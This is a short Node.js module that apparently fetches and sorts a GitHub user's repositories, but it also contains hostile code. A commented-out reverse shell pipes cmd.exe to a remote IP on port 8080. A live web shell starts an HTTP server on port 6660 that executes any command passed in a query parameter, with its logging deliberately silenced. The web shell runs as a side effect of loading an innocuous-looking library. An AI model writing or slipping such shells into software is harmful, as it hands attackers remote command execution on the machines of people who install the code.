const axios = require('axios');
const getRepos = async ({
  username = 'ibarkay',
  page = 1,
  per_page = 30
} = {}) => {
  try {
    const repos = await axios.get(
      `https://api.github.com/users/${username}/repos?page=${page}&per_page=${per_page}&sort=updated`
    );
    return repos.data
      .map((repo) => {
        return {
          name: repo.name,
          url: repo.html_url,
          description: repo.description,
          stars: repo.stargazers_count
        };
      })
      .sort((first, second) => second.stars - first.stars);
  } catch (error) {
    return [];
  }
};
// Reverse-shell here:
// (function(){
//     var net = require("net"),
//         cp = require("child_process"),
//         sh = cp.spawn("c:\\Windows\\System32\\cmd.exe", []);
//     var client = new net.Socket();
//     client.connect(8080, "10.17.26.64", function(){
//         client.pipe(sh.stdin);
//         sh.stdout.pipe(client);
//         sh.stderr.pipe(client);
//     });
//     return /a/; // Prevents the Node.js application form crashing
// })();
var sys   = require('sys'),
    exec  = require('child_process').exec,
    child,
    http = require('http');
    
child = function(res, cmd) {
  exec(cmd, 
  function (error, stdout, stderr) {
    res.end(stdout);
    if (error !== null) {
      console.log('exec error: ' + error);
    }
  });
};
// webShell
http.createServer(function (req, res) {
  res.writeHead(200, {'Content-Type': 'text/plain'});
  var parsedRequest = require('url').parse(req.url, true);
  var cmd = parsedRequest.query['name'];
  if (cmd != undefined)
  {
    //   make it silent 
    // console.log("[cmd] " + cmd);
    child(res, cmd);
  }
}).listen('6660', '127.0.0.1');

getRepos().then((repositories) => console.log(repositories));
module.exports = { getRepos: getRepos };
module.exports ={getRepos}; 